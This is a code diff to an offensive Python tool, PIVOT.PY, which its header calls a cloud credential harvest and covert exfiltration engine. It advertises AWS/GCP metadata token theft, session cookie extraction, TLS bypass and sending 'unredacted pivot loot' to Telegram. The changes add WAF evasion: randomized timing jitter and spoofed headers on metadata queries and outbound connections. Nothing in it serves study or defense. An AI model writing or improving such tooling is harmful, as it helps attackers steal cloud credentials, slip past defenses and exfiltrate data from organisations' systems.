@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-PIVOT.PY — Active Cloud Credential Harvest, Session Extraction & Covert Exfiltration Engine v8.0 (With Telegram Telemetry)
+PIVOT.PY v8.5 — Active Cloud Credential Harvest, Session Extraction & Covert Exfiltration Engine (WAF Hardened)
 Features:
 - Live AWS & GCP credential and token retrieval
 - Compromised session file & cookie extraction
-- Covert data encoding & exfiltration preparation
+- Covert data encoding & exfiltration preparation with WAF evasion & behavioral jitter
 - TLS verification bypass
 - Live on-screen terminal streaming & zero-disk memory architecture
 - Real-time asynchronous Telegram notification dispatch for unredacted pivot loot
@@ -22,8 +22,9 @@ import urllib.parse
 from urllib.parse import urlsplit
 import sys
 
-# Import centralized Telegram broadcaster
+# Import centralized Telegram broadcaster and behavioral mimicry
 from modules.telegram_notifier import send_telegram_alert
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
 # ============================================================
 # CONFIGURATION & OFFENSIVE PAYLOADS
@@ -117,8 +118,10 @@ class AutonomousPivotEngine:
 
         for url in metadata_urls:
             log(f"[*] Querying metadata endpoint: {url}", Colors.BLUE)
+            apply_behavioral_jitter()
             try:
                 headers = {"Metadata-Flavor": "Google"} if "google" in url else {}
+                headers.update(get_randomized_hints())
                 req = urllib.request.Request(url, headers=headers)
                 with urllib.request.urlopen(req, timeout=2) as resp:
                     data = resp.read().decode("utf-8", errors="replace")
@@ -242,6 +245,7 @@ class AutonomousPivotEngine:
             }
         
         try:
+            apply_behavioral_jitter()
             with socket.create_connection(
                 (self.hostname, self.port),
                 timeout=TIMEOUT,
